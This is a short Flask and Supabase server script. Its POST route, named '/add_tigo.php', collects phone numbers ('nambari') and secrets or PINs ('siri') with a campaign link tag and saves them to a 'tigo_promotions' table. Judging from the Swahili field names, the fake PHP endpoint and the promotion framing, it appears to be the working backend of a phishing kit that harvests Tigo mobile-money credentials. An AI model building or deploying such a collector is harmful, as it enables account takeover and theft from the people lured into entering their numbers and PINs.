from flask import Flask, request, render_template
import os
import traceback
from supabase import create_client

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "..", "templates")

app = Flask(__name__, template_folder=TEMPLATES_DIR)

supabase_url = os.environ.get("SUPABASE_URL")
supabase_key = os.environ.get("SUPABASE_KEY")

print("SUPABASE_URL:", supabase_url)
print("SUPABASE_KEY:", "SET" if supabase_key else "MISSING")

if not supabase_url or not supabase_key:
    raise RuntimeError("Supabase env vars missing")

supabase = create_client(supabase_url, supabase_key)
print("✅ Supabase connected")


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link", "gzktrsjamfkw")

        if not nambari or not siri:
            return "Missing fields", 400

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return "Data added successfully! ✅"

    except Exception:
        traceback.print_exc()
        return "Insert failed", 500
